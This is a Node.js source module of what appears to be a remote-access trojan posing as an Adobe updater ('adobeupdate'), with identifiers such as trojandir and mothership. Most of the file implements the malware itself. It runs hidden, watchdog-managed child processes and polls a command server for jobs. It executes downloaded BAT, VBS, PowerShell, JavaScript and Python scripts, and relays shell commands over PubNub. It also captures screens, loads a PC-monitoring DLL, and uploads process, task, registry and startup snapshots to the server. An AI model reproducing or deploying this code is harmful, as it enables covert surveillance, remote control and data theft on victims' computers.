const { fork, exec, spawn } = require("child_process");
const path = require("path");
const PubNub = require("pubnub");
const net = require("net");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

class CmdConfig {
    #__cmdname = "";
    #__launchprocname = ""; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
    #__launchscriptfname = ""; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
    #__childprocess = null;
    #__childpid = null;
    #__childcmds = [];
    #__parentcmdconfig = null;
    #__pubnubrelay = null;
    #__clientjob = null;
    #__cmdtaskname = "";

    get cmdtaskname() {
        return this.#__cmdtaskname;
    }

    get clientjob() {
        // system cmds don't support client jobs
        if (
            ["cmdlist", "ping", "watchdog", "launch_ping"].includes(
                this.cmdname.toLowerCase()
            )
        ) {
            return null;
        }

        if (this.#__clientjob) return this.#__clientjob;

        let configfpath = "";

        configfpath = process_argv.length >= 4 ? process_argv[3] : "";

        helper.logmsg(`reading configfpath: ${configfpath}`);

        if (!helper.fileExists(configfpath)) {
            throw new Error("configfpath does not exist " + configfpath);
        }

        let jsonconfigstr = helper.readTag(configfpath);

        if (helper.isNullOrWhitespace(jsonconfigstr)) {
            throw new Error("jsonconfigstr is empty");
        }

        helper.logmsg("jsonconfigstr=" + jsonconfigstr);

        let tclientjob = JSON.parse(jsonconfigstr);

        helper.logmsg("clientjob: " + JSON.stringify(tclientjob));

        this.#__clientjob = tclientjob;

        return this.#__clientjob;
    }

    set pubnubrelay(value) {
        this.#__pubnubrelay = value;
    }

    get pubnubrelay() {
        return this.#__pubnubrelay;
    }

    set parentcmdconfig(value) {
        return (this.#__parentcmdconfig = value);
    }

    get parentcmdconfig() {
        return this.#__parentcmdconfig;
    }

    get childpid() {
        return this.#__childpid;
    }

    get jobcode() {
        let configobj = this.clientjob;

        return configobj?.jobcode ?? "";
    }

    get childprocess() {
        return this.#__childprocess;
    }

    get launchscriptfname() {
        return this.#__launchscriptfname;
    }

    set cmdname(value) {
        if (CmdConfig.isCmdExist(value)) this.#__cmdname = value;
        else throw new Error("cmd is not supported [" + value + "]");
    }

    get cmdname() {
        return this.#__cmdname;
    }

    get launchprocname() {
        return this.#__launchprocname;
    }

    getChildCmd(cmdname) {
        for (let i = 0; i < this.#__childcmds.length; i++) {
            let childcmd = this.#__childcmds[i];
            if (childcmd.cmdname == cmdname) {
                return childcmd;
            }
        }

        return null;
    }

    get childcmds() {
        if (!this.#__childcmds) this.#__childcmds = [];

        return this.#__childcmds;
    }

    // should be overriden by implementing cmd
    loopfunc = async () => {
        helper.logmsg("pass");
    };

    newCmdConfig(tcmdname) {
        let childcmd = new CmdConfig(tcmdname, this);
        this.addchildcmd(childcmd);

        return childcmd;
    }

    constructor(tcmdname, cmdconfig) {
        this.cmdname = tcmdname;
        this.parentcmdconfig = cmdconfig;

        this.#__cmdtaskname = helper_ps.getcmdtaskname();
    }

    // list of supported commands
    // cmd line arg map to cmd func
    static cmdfuncs = {
        watchdog: watchdog,
        task: watchdog,
        launch_ping: watchdog,

        cmdlist: cmdlist,
        ping: ping,

        relay: relay,
        pcmon: pcmon,

        getsystemoverview: getsystemoverview,
        streamscreen: streamscreen,

        cleanup: cleanup,
        selfdestruct: null,
    };

    get dynamicdelay() {
        return crypto.randomInt(1, 10) * 5;
    }

    get cmdfunc() {
        return CmdConfig.cmdfuncs[this.cmdname];
    }

    static isCmdExist(tcmdname) {
        return Object.hasOwn(CmdConfig.cmdfuncs, tcmdname);
    }

    // REMOVE
    get cmdpidfpath() {
        return path.join(
            helper_config.systemconfig.trojandir,
            helper_ps.getcmdname() + "_running"
        );
    }

    // REMOVE
    readcmdpid() {
        if (!fileExists(this.cmdpidfpath)) return -1;

        let pid = helper.readTag(this.cmdpidfpath);

        return pid;
    }

    get lockfname() {
        let _fname = "";
        _fname = helper_config.systemconfig.trojanname + "_" + this.cmdname;
        _fname +=
            (!helper.isNullOrWhitespace(this.cmdtaskname)
                ? "_" + this.cmdtaskname
                : "") + "_lock";

        return "\\\\.\\pipe\\" + _fname;
    }

    // TEST exitparent
    async activate(cmdlineargs, exitparent) {
        helper.logmsg("starting");

        if (helper_ps.isPidAlive(this.childpid)) {
            helper.logmsg(
                `no need to run [${this.cmdname}]-- child process exists with pid [${this.childpid}]`
            );
            return;
        }

        let pipe_exists = await helper_ps.checkIfPipeExists(this.lockfname);

        if (pipe_exists) {
            helper.logmsg(
                `no need to run [${this.cmdname}]-- pipe exists with name [${this.lockfname}]`
            );

            return;
        }

        let ret = await this.launch(cmdlineargs, !exitparent ? false : true);

        return ret;
    }

    // [M5BR] ! overriden when new child cmd is created by cmdlist
    // see documentation below [X9W2]
    // default impelmentation: watchdog uses this function to relay messages between ping and cmdlist
    // message handler -- used by parent cmds to process incoming messages from child cmds
    processMessage(msg) {
        helper.logmsg("starting -- watchdog implementation");

        let parentcmd = this.parentcmdconfig;

        if (!parentcmd) return;

        let src = msg.src;
        let dest = msg.dest;
        let payload = msg.payload;

        let destcmd = parentcmd.getChildCmd(dest);

        if (!destcmd) {
            throw new Error("could not obtain child cmd for " + dest);
        }

        this.sendMessage(destcmd, src, payload);

        helper.logmsg("finished");
    }

    // used by parent cmds to send message to child cmds (watchdog send msg to ping, cmdlist)
    sendMessage(destcmd, src, msgpayload) {
        let childp = destcmd.childprocess;

        if (!childp) {
            throw new Error("childcmd does not have valid child process");
        }

        if (!helper_ps.isChildHealthy(childp)) {
            throw new Error("childprocess is not healthy");
        }

        let msgout = {
            senderPid: process.pid,
            src: src,
            dest: destcmd.cmdname,
            payload: msgpayload,
            ts: getTimestamp(),
        };

        if (childp.connected && !childp.killed) {
            helper.logmsg(
                "[VQ1J] sending message to child: " + JSON.stringify(msgout)
            );

            childp.send(msgout);
        }
    }

    async launch(cmdlineargs, exitparent) {
        if (!exitparent) exitparent = false;

        helper.logmsg(`[MN3M] launching [${helper_ps.getcmdname()}]`);

        let child = null;

        cmdlineargs = !(Array.isArray(cmdlineargs) && cmdlineargs.length >= 1)
            ? []
            : cmdlineargs;

        cmdlineargs = [this.cmdname, ...cmdlineargs];

        return new Promise((resolve, reject) => {
            if (!helper.fileExists(helper_config.systemconfig.trojanfpath)) {
                reject(
                    new Error(
                        `trojan script does not exists at ${helper_config.systemconfig.trojanfpath}`
                    )
                );
            }

            if (exitparent) {
                helper.logmsg("spawning child");
                child = spawn(
                    helper_config.systemconfig.nodeexepath,
                    [helper_config.systemconfig.trojanfpath, ...cmdlineargs],
                    { stdio: "ignore", windowsHide: true }
                );
            } else {
                helper.logmsg(
                    `forking child ${helper_config.systemconfig.trojanfpath}`
                );
                child = fork(
                    helper_config.systemconfig.trojanfpath,
                    cmdlineargs,
                    {
                        windowsHide: true,
                    }
                );
            }

            if (!child) {
                reject(new Error("failed to launch child proc"));
            } else {
                helper.logmsg("child process launch success");
            }

            child.unref();

            this.#__childprocess = child;
            this.#__childpid = child?.pid;
            this.#__launchprocname = path.basename(child.spawnargs[0]);
            this.#__launchscriptfname = path.basename(
                helper_config.systemconfig.trojanfpath
            );

            helper.logmsg(
                `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
                    JSON.stringify(child.spawnargs)
            );
            // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]

            helper.writeTag(this.cmdpidfpath, String(child.pid));

            // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
            child.on("message", (message) => {
                helper.logmsg(
                    "[YER]incomming message: " + JSON.stringify(message)
                );

                // [X9W2]: implemented within CmdConfig class, see documentation above [M5BR]
                this.processMessage(message);
            });

            child.on("exit", (code) => {
                helper.logmsg(
                    `Child process ${child.pid} exited with code ${code}`
                );
            });

            child.on("close", (code) => {
                helper.logmsg(`Process exited with code ${code}`);
            });

            child.on("error", (err) => {
                helper.logmsg("Failed to start child process:", err.message);
                reject(err);
            });

            child.on("spawn", () => {
                helper.logmsg(
                    `Child successfully started with PID: ${child.pid}`
                );

                resolve(child);
            });
        });
    }

    // REMOVE
    exitramp() {
        let fpath = path.join(helper_config.systemconfig.trojandir, "killall");

        if (helper.fileExists(fpath)) {
            helper.logmsg("found killall -- exiting");
            process.exit(0);
            return;
        }

        fpath = path.join(
            helper_config.systemconfig.trojandir,
            "reset_" + helper_cmd.runningcmd.cmdname
        );

        if (helper.fileExists(fpath)) {
            rmSync(fpath, { force: true });
            process.exit(0);
            return;
        }
    }

    async loop() {
        helper.logmsg("starting main looop");

        if (!this.loopfunc) {
            helper.logmsg("Fatal Error: loopfunc is not a valid function");
            process.exit(1);
        }

        let loopindex = 0;
        while (true) {
            loopindex++;
            helper.logmsg(
                `loop starting -- loopindex=${loopindex} -- ${helper.getTimestamp()}`
            );

            this.exitramp();

            try {
                if (helper.isAsyncFunction(this.loopfunc))
                    await this.loopfunc();
                else this.loopfunc();
            } catch (err) {
                helper.logmsg(err);
            }

            helper.logmsg(
                "sleeping for [" +
                    helper_config.systemconfig.staticdelay +
                    "] seconds"
            );

            for (
                let i = 0;
                i <
                (helper_ps.isdebug()
                    ? 3
                    : helper_config.systemconfig.staticdelay);
                i++
            ) {
                helper.logmsg(
                    `sleeping one second... [${i + 1}/${
                        helper_config.systemconfig.staticdelay
                    }]`
                );

                await helper.sleep(1000);
            }

            let num = this.dynamicdelay ?? crypto.randomInt(1, 10) * 5;

            helper.logmsg(`sleeping for an additional ${num} seconds`);

            for (let i = 0; i < (helper_ps.isdebug() ? 0 : num); i++) {
                helper.logmsg(
                    `sleeping one second... [${i + 1}/${
                        helper_config.systemconfig.staticdelay
                    }]`
                );
                await helper.sleep(1000);
            }
        }
    }

    addchildcmd(cmdconfig) {
        if (!this.childcmds) this.childcmds = [];

        this.childcmds.push(cmdconfig);
    }
}

// TODO implement
class ClientJob {}

// --- IPC for current running process: message send/receive

// incomming message handler for process.on("message"...
// overriden by child cmds (ping, cmdlist)
var handleMessage = function (msg) {
    helper.logmsg("pass");
};

// receives messages from parent process -- should be used by cmdlist, ping, relay
process.on("message", (message) => {
    if (!message) {
        throw new Error("null message");
    }

    helper.logmsg(`[XAW]incomming message:` + JSON.stringify(message));

    if (handleMessage) {
        helper.logmsg("handleMessage begin");
        handleMessage(message);
        helper.logmsg("handleMessage end");
    }
});

// sends message to parent process -- should be called by cmdlist, ping, relay
async function sendMessage(dest, msgpayload) {
    let isvalid = typeof process.send === "function" && process.connected;
    const parentPid = process.ppid;

    if (!isvalid) {
        throw new Error(
            "this process does not have a parent process to communicate with"
        );
        return;
    }

    helper.logmsg("[CHILD] sending message to parent pid=" + parentPid);

    let message = {
        senderPid: process.pid,
        src: helper_config.systemconfig.cmdname,
        dest: dest,
        payload: msgpayload,
        ts: getTimestamp(),
    };

    return new Promise((resolve, reject) => {
        process.send(message, undefined, undefined, (error) => {
            if (error) return reject(error);

            resolve();
        });
    });
}

// --- BEGIN watchdog

async function watchdog() {
    helper.logmsg("starting");

    let runningcmd = helper_cmd.runningcmd;

    // TODO check runningcmd cmdname is watchdog

    // let penetratecmd = new CmdConfig("penetrate");
    // let retrievecmd = new CmdConfig("retrieve");

    // retrievecmd.launch(null, true);
    // penetratecmd.launch(null, true);

    runningcmd.newCmdConfig("ping");
    runningcmd.newCmdConfig("cmdlist");
    // watchdogcmd.newCmdConfig("jsrelay");
    // watchdogcmd.newCmdConfig("psrelay");
    // watchdogcmd.newCmdConfig("cmdrelay");
    // watchdogcmd.newCmdConfig("pyrelay");

    let childcmds = runningcmd.childcmds;

    runningcmd.loopfunc = () => {
        for (let i = 0; i < childcmds.length; i++) {
            let childcmd = childcmds[i];

            childcmd.activate();
        }
    };

    runningcmd.loop();

    helper.logmsg("finished");
}

// --- END

// --- BEGIN ping

function validatePingResponse(pingresponse) {
    let downloadOpts = pingresponse.downloadOpts;

    if (!helper.fileExists(downloadOpts.localpath)) {
        return false;
    }

    if (!downloadOpts.filetype == "txt") {
        return false;
    }

    let rawtext = pingresponse.rawText;

    if (helper.isNullOrWhitespace(rawtext)) return false;

    let tokens = ["CLIENT_EXISTS", "CLIENT_EXISTS_NEW_PROFILE", "NEW_CLIENT"];

    for (let i = 0; i < tokens.length; i++) {
        if (rawtext.includes(tokens[i])) {
            helper.logmsg("ping reponse contains: " + tokens[i]);
            return true;
        }
    }

    helper.logmsg("ping reponse is not valid");

    return false;
}

// TODO shift logic to ClientJob class
function processClientJob(rawtext) {
    let clientjob = null;

    if (rawtext.includes("execute_cmdlist")) {
        clientjob = {
            jobtype: "execute_cmdlist",
            jobcode: "",
        };

        return clientjob;
    }

    let jobcode = helper.extractText(rawtext, "JOBCODE_BEGIN", "JOBCODE_END");

    let begintoken = "EXEC_CMD_BEGIN";
    let endtoken = "EXEC_CMD_END";
    let cmdstr = helper.extractText(rawtext, begintoken, endtoken);

    if (!helper.isNullOrWhitespace(cmdstr)) {
        let parts = cmdstr.split("|");
        parts = parts.filter((item) => !helper.isNullOrWhitespace(item));

        if (parts.length >= 1) {
            let clientjob = {
                jobtype: "EXEC_CMD",
                jobcode: jobcode,
                cmdname: parts[0],
                args: parts.length > 1 ? parts.slice(1) : [],
            };

            return clientjob;
        } else {
            throw new Error("client job request is malformed");
        }
    }

    let tokens = ["BAT", "VBS", "PS1", "JS", "PY"];

    for (let i = 0; i < tokens.length; i++) {
        let token = tokens[i];

        let scripttext = helper.extractText(
            rawtext,
            "EXEC_" + token + "_BEGIN",
            "EXEC_" + token + "_END"
        );

        if (!helper.isNullOrWhitespace(scripttext)) {
            let fpath = systemstate.getClientJobPath();
            fs.writeFileSync(fpath, scripttext, "utf8");

            if (!fileExists(fpath)) {
                throw new Error("unable to write script text to file " + fpath);
            }

            let clientjob = {
                jobtype: "EXEC_" + token,
                jobcode: jobcode,
                //scripttext: scripttext
                localpath: fpath,
            };

            return clientjob;
        }
    }

    return null;
}

async function ping_loop() {
    let baseUrl = helper_config.mothershipconfig.pingurl;

    let inputHeaders = null;
    let params = helper_config.systemconfig.statekvp;

    let pingpath = path.join(
        helper_config.systemconfig.trojandir,
        "ping_response"
    );
    let downloadOpts = { download: true, filetype: "txt", localpath: pingpath };
    let pingresponse = await helper_web.makeGetRequest(
        baseUrl,
        params,
        inputHeaders,
        downloadOpts
    );

    let isvalid = validatePingResponse(pingresponse);

    if (!isvalid) {
        helper.logmsg("ping response is invalid");
        helper_config.systemconfig.selectMothership();
        return;
    }

    let rawtext = pingresponse.rawText;

    let clientjob = processClientJob(rawtext);

    if (clientjob) {
        helper.logmsg(
            `sending job to cmdlist: jobcode=${clientjob.jobcode} jobtype: ${clientjob.jobtype}`
        );
        await sendMessage("cmdlist", clientjob);
    }
}

function ping() {
    helper.logmsg("starting");

    let runningcmd = helper_cmd.runningcmd;

    handleMessage = () => {
        helper.logmsg("pass");
    };

    runningcmd.loopfunc = ping_loop;

    runningcmd.loop();

    helper.logmsg("finished");
}

// --- END

// --- BEGIN cmdlist

function cmdlist_handlecmdjob(clientjob) {
    helper.logmsg("starting");

    let cmdlistcmd = helper_config.systemconfig.cmdconfig;

    let cmdname = clientjob.cmdname.toLowerCase();

    let stopcmd = false;

    if (cmdname.startsWith("start")) {
        cmdname = cmdname.replace("start", "");
    } else if (cmdname.startsWith("stop")) {
        cmdname = cmdname.replace("stop", "");
        stopcmd = true;
    }

    if (!CmdConfig.isCmdExist(cmdname)) {
        throw new Error(`command is not supported ${cmdname}`);
    }

    if (stopcmd) {
        let jobcmd = cmdlistcmd.getChildCmd(cmdname);

        if (!jobcmd) {
            throw new Error(`child cmd ${cmdname} not in child cmd list`);
        }

        jobcmd.processMessage = (msg) => {
            helper.logmsg(JSON.stringify(msg));
        };

        cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
    } else {
        let jobcmd = cmdlistcmd.newCmdConfig(cmdname);

        if (!jobcmd) {
            throw new Error(`could not create child cmd ${cmdname}`);
        }

        jobcmd.processMessage = (msg) => {
            helper.logmsg(JSON.stringify(msg));
        };

        let ret = jobcmd.launch([clientjob["configfpath"]]); // TODO refactor such that launch func grabs clientjob from jobcmd

        jobcmd.childprocess.unref();
    }

    helper.logmsg("finished");

    return;
}

// generates child cmds corresponding to clientjob being pushed via ping
// jobtype == 'EXEC_CMD' --> internal cmd is executed
//            'execute_cmdlist', --> job file is retrieved using retrieve.php
// otherwise job file is executed using script engine
async function cmdlist_handleMessage(msg) {
    helper.logmsg("starting");

    let cmdlistcmd = helper_cmd.cmdconfig;

    let clientjob = msg?.payload ?? null;

    if (!clientjob) {
        throw new Error("unable to extract clientjob");
    }

    helper.logmsg("received new client job: " + JSON.stringify(clientjob));

    let jobtype = clientjob?.jobtype ?? "";
    jobtype = jobtype.toLowerCase();

    if (jobtype == "execute_cmdlist") {
        clientjob = await retrieveClientJob();
    }

    let configfpath = path.join(
        helper_config.systemconfig.trojandir,
        "clientjobconfig_" + helper.getRandomCode(8) + ".json"
    );

    helper.writeTag(configfpath, JSON.stringify(clientjob));

    clientjob["configfpath"] = configfpath;

    if (!helper.fileExists(configfpath)) {
        throw new Error(`clientjobconfigpath does note exist ${configfpath}`);
    }

    if (jobtype.toLowerCase() == "EXEC_CMD".toLowerCase()) {
        cmdlist_handlecmdjob(clientjob);
        return;
    }

    // TODO: validate clientjob object before launching command

    let execjobcmd = cmdlistcmd.newCmdConfig("execjob");

    if (!execjobcmd) {
        throw new Error("could not create child cmd execjob");
    }

    let ret = execjobcmd.launch([configfpath]);

    execjobcmd.childprocess.unref();

    helper.logmsg("finished");
}

function cmdlist() {
    helper.logmsg("starting");

    let runningcmd = helper_cmd.runningcmd;

    if (runningcmd.cmdname != "cmdlist") {
        throw new Error("cmdlist routine must only be called from cmdlist cmd");
    }

    handleMessage = cmdlist_handleMessage;

    runningcmd.loopfunc = () => {
        helper.logmsg("cmdlist looping...");
    };

    runningcmd.loop();

    helper.logmsg("finished");
}

// --- END

async function cleanup() {
    // check if trojandir has hit limits, then execute cleanup
    // remove log files, etc.
    // remove cmdlist_ directories
    //   rmSync('./path/to/dir', { recursive: true, force: true });
    //   fs.unlinkSync('./path/to/file.txt');
    // *.json
    // *.log
}

// TODO add screencapture
async function getsystemoverview() {
    helper.logmsg("starting");

    let runningcmd = helper_cmd.runningcmd;

    let dir_snapshot = null;
    try {
        dir_snapshot = getDirInfo(helper_config.systemconfig.trojandir);
    } catch (err) {
        dir_snapshot = helper.errorToJson(err);
    }

    let task_snapshot = await getTasks();
    let process_snapshot = await getProcessList_wmic();

    let reg_snapshot = await Promise.all(
        regstartupconfig.reg_paths.map(async (reg_path) => {
            let ret = await query_reg(reg_path.replaceAll(":", ""));
            return ret;
        })
    );

    let startupdir_snapshots = await Promise.all(
        startupfolderconfig.folderpaths.map(async (folderpath) => {
            try {
                return getDirInfo(folderpath);
            } catch (error) {
                return errorToJson(error);
            }
        })
    );

    let outjson = {
        dir_snapshot: dir_snapshot,
        task_snapshot: task_snapshot,
        process_snapshot: process_snapshot,
        startupdir_snapshots: startupdir_snapshots,
        reg_snapshot: reg_snapshot,
    };

    let outjson_str = JSON.stringify(outjson);

    let localfpath = path.join(
        helper_config.systemconfig.trojandir,
        runningcmd.cmdname + "_out_" + getTimestamp() + ".json"
    );

    fs.writeFileSync(localfpath, outjson_str, "utf-8");

    let baseUrl = helper_config.systemconfig.mothership + "/ow/upload.php";

    let filename = "getsystemoverview.out";

    let kvp = helper_config.systemconfig.statekvp;
    kvp["filename"] = filename;
    kvp["jobcode"] = runningcmd.jobcode;

    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);

    helper.logmsg(JSON.stringify(response));

    process.exit(0);
}

function relay() {
    helper.logmsg("starting");

    let runningcmd = helper_cmd.runningcmd;

    let clientjob = runningcmd.clientjob;

    if (clientjob == null) {
        helper.logmsg("cannot start relay without client job");
        process.exit(1);
    }

    let args = clientjob.args || [];

    if (args.length == 0) {
        throw new Error(
            "cannot start relay as clientjob does not specify args"
        );
    }

    let enginename = args[0];
    enginename = enginename.toUpperCase();

    if (helper.isNullOrWhitespace(enginename)) {
        throw new Error("enginename is missing");
    }

    if (!["PY", "JS", "BAT", "PS1"].includes(enginename)) {
        throw new Error(`engine is not supported: ${enginename}`);
    }

    let pubnubr = null;

    // note: python relay uses its own pubnub logic within the python script (pythonrelay.py)

    // [7SZOSMSP]: wire up stdin of childp to incomming pubnub messages
    // lookup [CADZ248S] for the childp stdout handlers
    if (enginename != "PY") {
        runningcmd.pubnubrelay = new PubnubRelay(enginename);

        pubnubr = runningcmd.pubnubrelay;

        // handle incoming message from pubnub (cmds sent by host to client)
        pubnubr.handleMessage = (msgevent) => {
            let payload = msgevent.message;
            let cmdtext = payload.cmdtext;
            helper_ps.writeToChildProcess(childp, cmdtext);
        };
    }

    let childp = null;

    runningcmd.loopfunc = () => {
        helper.logmsg("relay looping...");

        pubnubr.publishMessage({
            ping: "ping " + getRandomCode(8),
            ts: getTimestamp(),
        });

        let tcmdpid = childp?.pid ?? -1;

        if (!helper_ps.isPidAlive(tcmdpid)) {
            childp = helper_relay.launchrelay(enginename, pubnubr, browsername);
        }
    };

    runningcmd.loop();

    helper.logmsg("finished");
}

function execjob() {
    helper.logmsg("starting");

    let configfpath = "";

    configfpath = process_argv.length >= 4 ? process_argv[3] : "";

    helper.logmsg("reading configfpath: " + configfpath);

    if (!helper.fileExists(configfpath)) {
        throw new Error("configfpath does not exist " + configfpath);
    }

    let jsonconfigstr = helper.readTag(configfpath);

    if (helper.isNullOrWhitespace(jsonconfigstr)) {
        throw new Error("jsonconfigstr is empty");
    }

    helper.logmsg("jsonconfigstr=" + jsonconfigstr);

    let clientjob = JSON.parse(jsonconfigstr);

    helper.logmsg("clientjob: " + JSON.stringify(clientjob));

    let jobfileext = path.extname(clientjob.jobfilename).toLowerCase();

    helper.logmsg("jobfileext: " + jobfileext);

    if (
        ![".bat", ".js", ".vbs", ".py", ".ps1"].includes(
            jobfileext.toLowerCase()
        )
    ) {
        throw new Error(`file extension is not supported ${jobfileext}`);
    }

    if (jobfileext.toLowerCase() == ".bat") {
        execCMDScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".py") {
        execPYTHONScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".js") {
        execNODEScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".vbs") {
        execVBSScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".ps1") {
        execPSScript(clientjob.localpath);
    }

    helper.logmsg("finished");
}

function launch_pcmon_koffi() {
    const koffi = require("koffi");

    let dllpath = path.join(helper_config.systemconfig.pcmondir, "pcmon.dll");

    if (!helper.fileExists(dllpath)) {
        throw new Error("dll does not exist " + dllpath);
    }

    process.chdir(helper_config.systemconfig.pcmondir);

    const lib = koffi.load(dllpath);
    const pcmon_func = lib.func("__stdcall", "pcmon_main", "int", []);
    pcmon_func();
}

async function pcmon_tpl() {
    let dllpath = path.join(helper_config.systemconfig.pcmondir, "pcmon.dll");

    if (!helper.fileExists(dllpath)) {
        await download_pcmon();

        if (!helper.fileExists(dllpath)) {
            throw new Error("failed to download pcmon.dll");
        }
    }

    try {
        launch_pcmon_koffi();
    } catch (err) {
        helper.logmsg(err);
    }
}

async function pcmon() {
    helper.logmsg("starting");

    let pcmoncmd = helper_config.systemconfig.cmdconfig;

    if (helper_config.systemconfig.istpl) {
        await pcmon_tpl();
        return;
    }

    let exepath = path.join(helper_config.systemconfig.pcmondir, "pcmon.exe");

    if (!helper.fileExists(exepath)) {
        await download_pcmon();

        if (!helper.fileExists(exepath)) {
            throw new Error("failed to download pcmon.exe");
        }
    }

    let killswitch = false;

    handleMessage = (msgobj) => {
        let clientjob = msg?.payload ?? null;

        if (!clientjob) {
            throw new Error("unable to extract clientjob");
        }

        helper.logmsg("received new client job: " + JSON.stringify(clientjob));

        if (clientjob?.cmdname.toLowerCase() == "StopPCMon".toLowerCase()) {
            killswitch = true;
        }
    };

    let childp = null;

    pcmoncmd.loopfunc = () => {
        helper.logmsg(`{pcmoncmd.cmdname} looping...`);

        let tcmdpid = childp?.pid ?? -1;

        if (killswitch) {
            if (isPidAlive(tcmdpid)) childp.kill();

            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
        }

        if (!killswitch && !isPidAlive(tcmdpid)) {
            childp = invoke_exe("pcmon.exe");
        }
    };

    pcmoncmd.loop();

    helper.logmsg("finished");
}

async function pspcmon() {
    helper.logmsg("starting");

    let pspcmoncmd = helper_config.systemconfig.cmdconfig;

    let scriptfpath = path.join(
        helper_config.systemconfig.pspcmondir,
        "pc_monitoring.ps1"
    );

    if (!helper.fileExists(scriptfpath)) {
        await download_pspcmon();
    }

    if (!helper.fileExists(scriptfpath)) {
        throw new Error("pspcmon script does not exist " + scriptfpath);
    }

    let killswitch = false;

    handleMessage = (msgobj) => {
        let clientjob = msg?.payload ?? null;

        if (!clientjob) {
            throw new Error("unable to extract clientjob");
        }

        helper.logmsg("received new client job: " + JSON.stringify(clientjob));

        if (clientjob?.cmdname.toLowerCase() == "StopPSPCMon".toLowerCase()) {
            killswitch = true;
        }
    };

    let childp = null;

    pspcmoncmd.loopfunc = () => {
        helper.logmsg(`{pspcmoncmd.cmdname} looping...`);

        let tcmdpid = childp?.pid ?? -1;

        if (killswitch) {
            if (isPidAlive(tcmdpid)) childp.kill();

            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
        }

        if (!killswitch && !isPidAlive(tcmdpid)) {
            childp = execPSScript(scriptfpath);
        }
    };

    pspcmoncmd.loop();

    helper.logmsg("finished");
}

// --- BEGIN streamscreen

async function streamscreen() {}

function exec_getscreencapture() {
    return new Promise((resolve, reject) => {
        let stdout = "";

        let fpath = path.join(
            systemstate.trojandir,
            "get_full_screen_capture.ps1"
        );

        let childp = execPSScript(
            fpath,
            [systemstate.trojandir],
            null,
            (text) => (stdout += text),
            (text) => (stdout += text),
            (code) => {
                resolve(stdout);
            }
        );
    });
}

async function getscreencapture() {
    helper.logmsg("starting");

    let runningcmd = systemstate.cmdconfig;

    let ret = null;

    ret = await helper.logmsgMothership(
        `starting getscreencapture -- jobcode=${runningcmd.jobcode}`
    );

    ret = await logEventMothership("job_started", runningcmd.jobcode);

    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
    let localpath = path.join(systemstate.trojandir, filename);

    if (!fileExists(localpath)) {
        let response = await download_screencapture_script();
    }

    if (!fileExists(localpath)) {
        throw new Error(`screencapture script does not exist ${localpath}`);
    }

    let stdout = await exec_getscreencapture();

    let lines = stdout.split(/\r?\n/);

    for (let i = 0; i < lines.length; i++) {
        let line = lines[i];

        if (line.startsWith("filepath=")) {
            let fpath = line.split("=")[1];
            let fname = path.basename(fpath);

            let ret = await upload_file(fname, runningcmd.jobcode, fpath);

            // TODO helper.logmsg file upload
        }
    }

    ret = await logEventMothership("job_finished", runningcmd.jobcode);

    // job_finished_with_error

    process.exit(0);
}

// --- END

const helper_ps = require("./adobeupdate.helper.ps.js");

var runningcmdname = helper_ps.getcmdname();
var runningcmd = new CmdConfig(runningcmdname);

module.exports = {
    CmdConfig: CmdConfig,
    runningcmd: runningcmd,
};

const helper = require("./adobeupdate.helper.js");
const helper_config = require("./adobeupdate.helper.config.js");
const helper_cmd = require("./adobeupdate.helper.cmd.js");
const helper_web = require("./adobeupdate.helper.web.js");
const helper_relay = require("./adobeupdate.helper.relay.js");
